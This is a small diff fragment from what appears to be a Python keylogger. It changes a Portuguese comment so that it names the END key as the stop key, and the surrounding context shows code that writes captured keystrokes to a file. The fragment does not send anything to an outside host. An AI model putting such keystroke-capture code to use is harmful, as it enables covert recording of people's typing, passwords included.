@@ -24,7 +24,7 @@ def write_file(keys):
                 f.write('\n')
             elif k.find("key") ==  -1:
                 f.write(k)
-#Para a execução assim que clicado em F1 no keyboard
+#Para a execução assim que clicado em END no keyboard
 def on_release(key):
     if key == Key.end:
         return False
